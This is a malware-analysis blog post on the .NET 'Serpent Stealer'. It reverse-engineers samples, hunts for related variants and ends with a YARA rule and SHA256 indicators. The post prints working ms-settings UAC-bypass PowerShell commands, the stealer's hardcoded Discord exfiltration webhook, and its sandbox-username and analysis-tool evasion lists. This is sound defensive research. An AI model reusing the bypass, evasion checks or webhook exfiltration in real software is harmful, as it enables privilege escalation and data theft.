---
title: Hunt and Analysis - Serpent Stealer
author: Tufan Gungor
date: 2024-01-07 00:00:00 +0800
categories: [Reverse Engineering,Malware Hunting]
tags: [reverse engineering,malware hunting]
math: true
mermaid: true
---

# Part 1 - Dissecting the First Serpent Stealer Sample

On October 15, 2023, a new malware named `Serpent Stealer` was showcased on [Breach Forums](https://breachforums.is/Thread-Serpent-Stealer-1-On-The-Market-Affordable) by a user named `stealth`. This malware, categorized as a standard stealer, deviates from the norm in its operational tactics. Unlike others that rely on a command and control (C2) server, the 'Serpent Stealer' utilizes a `Discord webhook` for its functionality, as highlighted by its developer. 

![Untitled](/assets/img/serpent/1.png)

An extensive search on VirusTotal using keywords such as `SerpentStealer` led to the discovery of the first sample of Serpent Stealer, known by the filename `Serpent.dll` This sample was first recorded on October 12, 2023. In the first part of our article, we delve into an in-depth analysis of this particular file, unraveling its characteristics and behavior.

**SHA256: *5ff20ad3f1b84b6e702bed2a9ff8e0510615a1d60dd123a9d3cbd1d9e2b5357d***

*Exeinfo output for Serpent.dll*

`x64 .NET exe file with : 00 Entry Point - CPU : AMD64 - code size : 34.5 KB`

The analysis of 'Serpent.dll' began with EXEinfo, which classified it as a .NET file. This led us to examine it in DNSpy, specifically the Main function. Initial observations revealed that the stealer followed a basic, almost 'copy/paste' methodology. Remarkably, it was devoid of complexities like obfuscation and encryption, leaving it unprotected and relatively simple in design.

![Untitled](/assets/img/serpent/2.png)

A particular string within the Main function of `Serpent.dll` drew our attention; the function `steamClient.GetSteam()` included a hardcoded directory path `C:\\Users\\Aperx\\Desktop`. This detail suggests that the malware developer might have used this path for testing purposes and inadvertently left it in the code. We plan to leverage this specific string in our subsequent search for related samples.

```text
C:\\Users\\Aperx\\Desktop
```

## Anti-Analysis Techniques

The malware incorporates two distinct anti-analysis techniques: `AntiVT` and `AntiAV`. However, considering that the VirusTotal detection score for this file stands at 41 out of 72, it's apparent that these functions didn't perform as effectively as intended.

### 1. AntiVT.IsVirusTotal()

![Untitled](/assets/img/serpent/3.png)

In its initial layer of defense, the malware uses an anti-analysis function named `AntiVT.IsVirusTotal()`. This function involves a simple yet specific check: it compares the computer's name with a predefined list of `126 names`, all hardcoded by the malware's creator. Should there be a match with any name in the list, the malware automatically ceases to function. This is a basic tactic to avoid analysis.

```text
"05h00Gi0",
"3u2v9m8",
"43By4",
"4tgiizsLimS",
"6O4KyHhJXBiR",
"7wjlGX7PjlW4",
"8Nl0ColNQ5bq",
"8VizSM",
"Abby",
"Amy",
"AppOnFlySupport",
"ASPNET",
"azure",
"BUiA1hkm",
"BvJChRPnsxn",
"cM0uEGN4do",
"cMkNdS6",
"DefaultAccount",
"dOuyo8RV71",
"DVrzi",
"e60UW",
"ecVtZ5wE",
"EGG0p",
"Frank",
"fred",
"G2DbYLDgzz8Y",
"george",
"GjBsjb",
"Guest",
"h7dk1xPr",
"h86LHD",
"Harry Johnson",
"HEUeRzl",
"hmarc",
"ICQja5iT",
"IVwoKUF",
"j6SHA37KA",
"j7pNjWM",
"John",
"jude",
"Julia",
"kEecfMwgj",
"kFu0lQwgX5P",
"KUv3bT4",
"Lisa",
"lK3zMR",
"lmVwjj9b",
"Louise",
"Lucas",
"mike",
"Mr.None",
"noK4zG7ZhOf",
"o6jdigq",
"o8yTi52T",
"OgJb6GqgK0O",
"patex",
"PateX",
"Paul Jones",
"pf5vj",
"PgfV1X",
"PqONjHVwexsS",
"pWOuqdTDQ",
"PxmdUOpVyx",
"QfofoG",
"QmIS5df7u",
"QORxJKNk",
"qZo9A",
"RDhJ0CNFevzX",
"RGzcBUyrznReg",
"S7Wjuf",
"server",
"SqgFOf3G",
"Steve",
"test",
"TVM",
"txWas1m2t",
"umyUJ",
"Uox1tzaMO",
"User01",
"w0fjuOVmCcP5A",
"WDAGUtilityAccount",
"XMiMmcKziitD",
"xPLyvzr8sgC",
"ykj0egq7fze",
"DdQrgc",
"ryjIJKIrOMs",
"nZAp7UBVaS1",
"zOEsT",
"l3cnbB8Ar5b8",
"xUnUy",
"fNBDSlDTXY",
"vzY4jmH0Jw02",
"gu17B",
"UiQcX",
"21zLucUnfI85",
"OZFUCOD6",
"8LnfAai9QdJR",
"5sIBK",
"rB5BnfuR2",
"GexwjQdjXG",
"IZZuXj",
"ymONofg",
"dxd8DJ7c",
"JAW4Dz0",
"GJAm1NxXVm",
"UspG1y1C",
"equZE3J",
"BXw7q",
"lubi53aN14cU",
"5Y3y73",
"9yjCPsEYIMH",
"GGw8NR",
"JcOtj17dZx",
"05KvAUQKPQ",
"64F2tKIqO5",
"7DBgdxu",
"uHUQIuwoEFU",
"gL50ksOp",
"Of20XqH4VL",
"tHiF2T",
"sal.rosenburg",
"hbyLdJtcKyN1",
"Rt1r7",
"katorres",
"doroth",
"umehunt"
```

### 2. AntiAv.IsAvPresent()

![Untitled](/assets/img/serpent/4.png)

The second anti-analysis function, `AntiAV.IsAvPresent()`, operates by cycling through the list of running processes and comparing them with a predefined set of `53 process names`. Despite its name suggesting a focus on anti-virus software, this function extends its reach to include various other processes, such as debuggers, malware analysis tools, and virtual machine processes, showcasing a broader scope of detection evasion.

```text
"ProcessHacker.exe",
"httpdebuggerui.exe",
"wireshark.exe",
"fiddler.exe",
"regedit.exe",
"cmd.exe",
"taskmgr.exe",
"vboxservice.exe",
"df5serv.exe",
"processhacker.exe",
"vboxtray.exe",
"vmtoolsd.exe",
"vmwaretray.exe",
"ida64.exe",
"ollydbg.exe",
"pestudio.exe",
"vmwareuser.exe",
"vgauthservice.exe",
"vmacthlp.exe",
"vmsrvc.exe",
"x32dbg.exe",
"x64dbg.exe",
"x96dbg.exe",
"vmusrvc.exe",
"prl_cc.exe",
"prl_tools.exe",
"qemu-ga.exe",
"joeboxcontrol.exe",
"ksdumperclient.exe",
"xenservice.exe",
"joeboxserver.exe",
"devenv.exe",
"IMMUNITYDEBUGGER.EXE",
"ImportREC.exe",
"reshacker.exe",
"windbg.exe",
"32dbg.exe",
"64dbg.exex",
"protection_id.exex",
"scylla_x86.exe",
"scylla_x64.exe",
"scylla.exe",
"idau64.exe",
"idau.exe",
"idaq64.exe",
"idaq.exe",
"idaq.exe",
"idaw.exe",
"idag64.exe",
"idag.exe",
"ida64.exe",
"ida.exe",
"ollydbg.exe",
```

## UAC Bypass

This malware sample employs a UAC (User Account Control) Bypass using three PowerShell commands. The first command creates a new registry entry. The second, adds a new property to this entry, crucial for the bypass mechanism. The third command, sets a specific value to this entry, thus allowing the malware to execute commands without UAC intervention.

```powershell
New-Item “HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command” -Force
New-ItemProperty -Path “HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command” -Name “DelegateExecute” -Value “” -Force
Set-ItemProperty -Path “HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command” -Name “(default)” -Value \"{0}\" -Force
```

![Untitled](/assets/img/serpent/5.png)

## Data Exfiltration

Once it has gathered all the data set to be stolen, the Serpent Stealer initiates a request to `checkip.dyndns.org`. This action is undertaken to acquire the public IP address of the infected machine. Subsequently, it proceeds to transmit all the accumulated data to a Discord server, utilizing a webhook for this purpose. This sequence of actions highlights the malware's methodical approach in executing its data exfiltration process.

![Untitled](/assets/img/serpent/6.png)

```csharp
public static string Webhook_link = "https://discord.com/api/webhooks/1156720932375756921/Xu5g1XzMRXTKDzrIOMcPMC1orYzXGQKBYTTRVOX4oR-IbivHh0LzqCucl2b-obrco6jj";
```

This particular sample appears to be from the early stages of development, as evidenced by numerous informative messages within the malware's code. For instance, lines like 

```csharp
Console.WriteLine("[+] Program finished.");
Console.WriteLine("[-] Target does not have FTP.");
```

suggest a debugging phase. Additionally, as previously mentioned, the hardcoded folder path `C:\Users\Aperx\Desktop` left in the malware indicates an oversight. These factors lead to the conclusion that this file was likely not ready for widespread distribution in a malware campaign and was still a work in progress.

The absence of obfuscation, encryption, or any form of packing in this malware allows for a straightforward understanding of its capabilities just by examining its function names. Due to this simplicity, an in-depth analysis of each function is unnecessary. It is, in essence, a typical copy/paste .NET stealer.

# Part 2 - Hunting for New Samples

In Part 2 of our article, focused on Hunting for New Samples, we encounter a variety of specific strings within the 'Serpent Stealer' sample. Among these, `C:\\Users\\Aperx\\Desktop` emerges as particularly indicative of the developer's involvement. This string has guided our search efforts. 

Searching `“Users\\Aperx\\”` in VirusTotal, we have identified 11 instances that match this criterion. The following is the list of these matches.

| File Name | File Hash | Detections  | First Seen |
| --- | --- | --- | --- |
| SerpentPremium.dll | 382b9a9dcae2166c4b1ec4c2010104c62e2afb170605bd39c0feee622d5d29e9 | 1 / 72 | 2023-12-31 |
| RsrcPractice.exe | 202fca883d2e6db7d7259ed11cbf0b4ba58c5ead3640b5ee09b9aca823a49cb0 | 49 / 72 | 2023-12-01 |
| RsrcPractice.exe | 078d6a0e208fe8ab036aaa62b0f325a2583a7b1a74e7ae50298e0db2b31274ef | 50 / 72 | 2023-11-30 |
| nitrohax.dll | ce70fe6f2fb6dc0f1abd000659db50d4bb549210ff8b4850d81c963587d83041 | 3 / 64 | 2023-11-11 |
| No name | 3dd96e139d320c5cd4e7f46ef5fa3d119af54659f7210659a5f91c11db3a3f45 | 20 / 61 | 2023-11-04 |
| Nigga.pdf.lnk | 29e7761575e0a8d4c732a0a0221c90606613b9233be55fb809278a0c4a6e75b6 | 25 / 61 | 2023-11-04 |
| Serpent.dll | 4c6cbc32e63a918cfa0ffc7486fb3210aeb2d9b08e6e4f7976582215acc99c41 | 0 / 72 | 2023-10-25 |
| Serpent.dll | 25c033dd58e3b48b84ec9cb4ffe0c2f9293e7a4b4c81452c49abf7dda61db6ce | 27 / 71 | 2023-10-19 |
| Serpent.dll | 212c4eba1bf5f695c563668c09cd3399d484d5bd5945edea97dc1ecbfd3a3eed | 43 / 71 | 2023-10-12 |
| Serpent.dll | 6b82bfbdf2e9666bd0c74280ee20c14044fee9d711ae340c8dc388104695b75d | 44 / 72 | 2023-10-12 |
| Serpent.dll | 5ff20ad3f1b84b6e702bed2a9ff8e0510615a1d60dd123a9d3cbd1d9e2b5357d | 41 / 72 | 2023-10-12 |

## New Version Analysis

The sample discovered on October 25, 2023, stands out notably due to its zero detection rate on VirusTotal, drawing our immediate attention. Let's proceed to analyze this particular sample in detail, exploring its unique attributes and potential implications.

![Untitled](/assets/img/serpent/7.png)

Once more, we find that this file is written in .NET, prompting us to use DNSpy for its analysis. A thorough examination in DNSpy reveals a familiar pattern: the absence of obfuscations or encryptions. Just like its predecessors, it's a straightforward, cleartext simple stealer, laying bare its functionalities.

![Untitled](/assets/img/serpent/8.png)

This particular sample takes a structured approach to data storage. It establishes a new folder labeled 'Serpent' in the Temp path, where it systematically stores the pilfered data. The malware accomplishes this by generating individual files within this folder, each containing a segment of the stolen information.

![Untitled](/assets/img/serpent/9.png)

Comparing this sample with the first, we observe some key differences. Notably, this version lacks any Anti-Analysis mechanisms. Furthermore, it deviates in its data processing methodology – it accumulates data but stops short of exfiltrating it, choosing instead to store it in the '%Temp%\Serpent\' directory. This pattern leads us to speculate that we might be looking at a test version, not fully equipped for deployment in a malware campaign. Additionally, the lack of data exfiltration likely plays a role in its zero detection status, as it reduces the likelihood of triggering security alerts.

## Serpent Premium

During our investigative journey on VirusTotal, using `Users\\Aperx\\` as our search query, we stumbled upon a file called `SerpentPremium.dll`. Given its 'Serpent' nomenclature and the shared folder path, there's a strong indication that we might be dealing with a new iteration of the 'Serpent Stealer'. We will now delve into an analysis of 'SerpentPremium.dll' to explore its characteristics and validate if it is indeed a new variant.

**SHA256: *382b9a9dcae2166c4b1ec4c2010104c62e2afb170605bd39c0feee622d5d29e9***

![Untitled](/assets/img/serpent/10.png)

Upon examining the connections related to `SerpentPremium.dll`, we discovered that it was extracted from an archive named `Cobra-main.zip`. This finding prompts us to shift our focus to 'Cobra-main.zip'. 

![Untitled](/assets/img/serpent/11.png)

Investigating its associations further, we notice a GitHub link listed under the 'Memory pattern URLs' section on VirusTotal. This new lead could unveil additional layers in our exploration of the malware's origins and associations.

![Untitled](/assets/img/serpent/12.png)

```text
https://github.com/0xSerpent/Cobra
```

![Untitled](/assets/img/serpent/13.png)

In the words of its creator, '*Cobra is a C# Remote Access Tool, made due to the lack of good Remote Access Tools that do not need port forwarding, (and the ones that do exist, sort of suck).*' This tool was co-developed by `0x-Stealth` (notably associated with the 'SerpentStealer' post on Breach Forums) and `m21acro`. Cobra mirrors certain aspects of the Serpent Stealer, notably in its use of the same UAC bypass technique. 

```csharp
string powershellScript = @"
 New-Item ""HKCU:\Software\Classes\ms-settings\Shell\Open\command"" -Force
 New-ItemProperty -Path ""HKCU:\Software\Classes\ms-settings\Shell\Open\command"" -Name ""DelegateExecute"" -Value """" -Force
 Set-ItemProperty -Path ""HKCU:\Software\Classes\ms-settings\Shell\Open\command"" -Name ""(default)"" -Value $program -Force
";
```

Additionally, it operates independently of a traditional C2 or server infrastructure, being controlled instead by a Discord bot.

In our extensive hunt, we also identified a version of 'Serpent Stealer' labeled as C++. However, instead of being developed from scratch in C++, it simply involves calling a .NET DLL from C++. The efficacy of our Yara rule extends to both the .NET and C++ versions, hence further analysis of this variant is not deemed necessary.

# Part 3 - C2 Panel

In this section of our article, Part 3 - C2 Panel, we address claims about C2 Panels associated with `SerpentStealer` found online. This inclusion is essential for a comprehensive analysis.

![Untitled](/assets/img/serpent/14.png)

Interestingly, all the samples we've analyzed, identified as Serpent Stealer, showed no signs of interacting with any C2 server. There was a clear absence of any links between the Serpent.dll samples and the C2 server IP addresses mentioned online. Reinforcing this observation, the developer noted in their Breach Forums post that 'Serpent Stealer uses Discord Webhook to exfiltrate data, no c2 / server required.' The developer's precise wording was 'Outputs Logs to Discord Webhook (No C2/Server Required).

![Untitled](/assets/img/serpent/15.png)

Further investigations reveal that another tool developed by the same creator, known as `Cobra (Serpent RAT)`, also utilizes Discord webhooks instead of a traditional C2 server. This consistent pattern suggests with high confidence that this particular threat actor generally opts for Discord webhooks over C2 servers. This observation leads us to question the authenticity of C2 addresses linked to 'Serpent Stealer' in various online sources, such as the ones mentioned in a specific tweet. It seems increasingly likely that these C2 addresses might not actually be associated with 'Serpent Stealer'.

# Part 4 - Yara Rule / IOCs

```php
rule SerpentStealer {
	meta:
		author = "tufan - @tufan_gngr"
		description = "Detects .NET based malware named Serpent Stealer"
		date = "2024-01-07"
		references = "https://tufan-gungor.github.io/"
	strings:
		$s1 = "serpent" nocase
		$s2 = "steamclient" nocase
		$s3 = "steamapikey" nocase
		$s4 = "discordstealer" nocase
		$s5 = "historystealer" nocase
		$s6 = "Users\\Aperx" nocase
		$s7 = "passwordstealer" nocase
		$s8 = "bookmarkstealer" nocase
		$s9 = "autofillstealer" nocase
	condition:
		uint16(0) == 0x5A4D and 
		uint32(uint32(0x3C)) == 0x00004550 and
		5 of them
}

```

After implementing our custom Yara rule for detecting 'Serpent Stealer' in a Retrohunt on VirusTotal, the search yielded 38 instances of the malware. Subsequently, I compiled SHA256 IOCs of the 'Serpent Stealer' from Github contributions by fellow researchers and re-ran my Yara rule against this consolidated list. Impressively, there was a match for `38 out of the 44` hashes.

Upon closer examination, we discovered why our match rate wasn't a complete 44/44. It turns out that 6 hashes, initially thought to be linked to 'Serpent Stealer' and shared by other researchers, actually belonged to `Exela Stealer`. By removing these erroneous hashes from our analysis, we achieved a flawless match of 38/38.

***Exela Stealer***

```text
1a4205058e912576a1de66af027cf53f32d862102108d556968647913cb778ce
35fbbfeae68bcae26ad9bccc3b983862d27f2053b2706b4aa33d11acf9ab3aca
6c14f5983ad0e4c9a31fcf3184332d9e4303f085bf866057f914990ea825fa52
789a9e3d6cf07d241935638670c2177e261f395107de0a7aea9e2882363a9083
7ac6012327bf433286be5e98d8c69633e73e64b017a886f63dafab7d6f68ff9f
a753967096145e7e8b0a3d2d4e952ae67f1c9a9974242fa3302287812de0f0ed

```

***Serpent Stealer***

```text
00b09f9e47986fcff9506c379e27b2361e40e46fc49c3c4d60c4a8402c857f62
0edc6f2868e4759f541732d1e7ed6ee648736612bf5bf24f737971a65a558110
212c4eba1bf5f695c563668c09cd3399d484d5bd5945edea97dc1ecbfd3a3eed
23fdc2c625766231b05a4d49e3435196cadb69154d29dc509a3e5f26393e1a54
24db3ebba8ef08d3ec207e45db936f6064bc41dde32ea97b9eb48fa6f20da948
25c033dd58e3b48b84ec9cb4ffe0c2f9293e7a4b4c81452c49abf7dda61db6ce
2a71d550b7f2be38fa120f3fa0726ce370d2983231d3ab823d99f5d50ce79ca4
2f38a024861649bbfcea0c53869dc3036a4ddcc7a7a07011e21f17c5ab67abd6
31634c953506e3a1da501044c5aba27aa3074fb70a0d1c16f89c706a89d0ab51
349d4ba8bfc898896d925ddfb43095fa6e486138eb06191fe0ddf9b026513862
37c7607ee4ae0741f6e38b7ddd55392d41cdcfc238203dfea24ac87611db8396
3aa2b8af0f25d926d8a02042e0cf71d6cabb781e00295702541b39fe2a630f9b
3c620ede8d0f92f39e80f03cbf84967881789bbb2748cea3e0c51fa552b68371
4b58cb217a8b42378128d88e873e3eb611f1e0c3f51ba060a0130fe522453e2c
4b9e172aec228e7d562461f88fa6c6d176e223726de2c67f3464a432251734e2
4c6cbc32e63a918cfa0ffc7486fb3210aeb2d9b08e6e4f7976582215acc99c41
4d5431b80340043b87699c7f245005e55b4de70ff97df548dd9cb3b8902773e9
59f96183a0c0365d42eeecca53941dfb128449ea93edb2fe6b0ae7a7e36fecda
5bafa1993e90a3cdf7dca373fddfa8255d75621ba276299ef119d68f1bc6e85e
5ff20ad3f1b84b6e702bed2a9ff8e0510615a1d60dd123a9d3cbd1d9e2b5357d
6b82bfbdf2e9666bd0c74280ee20c14044fee9d711ae340c8dc388104695b75d
6c237036ebd8275d41def2f8be0fec4e7754f180b0b98f30461396753bd3d262
7670c776c8f07236af6d94adf14de1216140c16fa8db44135660c239313fac93
908a1af19e0a77317619ca05e7f03f3256ec8f5959a9bb29c31b428547b14f9c
979f1c5212a2408dbc8fae1088198e7631a992d306a4178fa1cb0117f936534c
9ef28fd1f7eb7a71aae2a3e9d4ff1327a7d5a60a74b18cbb8aae1d31473878b9
a9175b2800be17be05d141ad2f7bf2faeef24bd10a455a9478b0d5ba082a287e
a9e9e02742cc91156c7bd3bfcac8165855c72480f42b0bc2308ceb5595a883b1
aa1f3af70210dd0886ab0f9273acc28b39c35905036b38f2840aa1a18ddaf05c
be2a557fea54a051c55d59e21f0fce4547a0c60ef9b2aa19fe65befa20efa8e5
bfafccbcfe72483ce31b6a5382053e29a555932944bed1e4e752376441e57562
c4f981f1f532ec827032775c88a45f1b4153c3d27885f189654ad6ee85c709c1
cd118e082d2c035da179358c8a3c54b879b6e1b71eec2a965b78aa929b83eb11
ce70fe6f2fb6dc0f1abd000659db50d4bb549210ff8b4850d81c963587d83041
e60a754c658df7edef8e4785de4b3374b9d0bf3efbc553a617032729e2d0d684
e91111aa62210fbfb5e726b10a92463179408ba5741fddb89bfc16d787ade60e
f33c32d58671cbcfb1ee150627ee641908bf8ca277d6555cb10edd7787a75344
ff2b9589a477499d34853ec843824091d2e6fa1301d5ab3242931afec6845351
```

![Untitled](/assets/img/serpent/16.png)

Additionally, the retrohunt conducted with this Yara rule over the last 90 days on VirusTotal indicated a remarkable accuracy, showing no false positives in the results.

# References

- [https://breachforums.is/Thread-Serpent-Stealer-1-On-The-Market-Affordable](https://breachforums.is/Thread-Serpent-Stealer-1-On-The-Market-Affordable)
- [https://twitter.com/karol_paciorek/status/1722590659532447810](https://twitter.com/karol_paciorek/status/1722590659532447810)
- [https://github.com/ThreatMon/ThreatMon-Reports-IOC/tree/main/Serpent-Stealer-Unmasked-Threat-Analysis-and-Countermeasures](https://github.com/ThreatMon/ThreatMon-Reports-IOC/tree/main/Serpent-Stealer-Unmasked-Threat-Analysis-and-Countermeasures)
- [https://malpedia.caad.fkie.fraunhofer.de/details/win.serpent](https://malpedia.caad.fkie.fraunhofer.de/details/win.serpent)

**I utilized AI assistance to fine-tune certain sentences in this post, enhancing clarity and precision.**
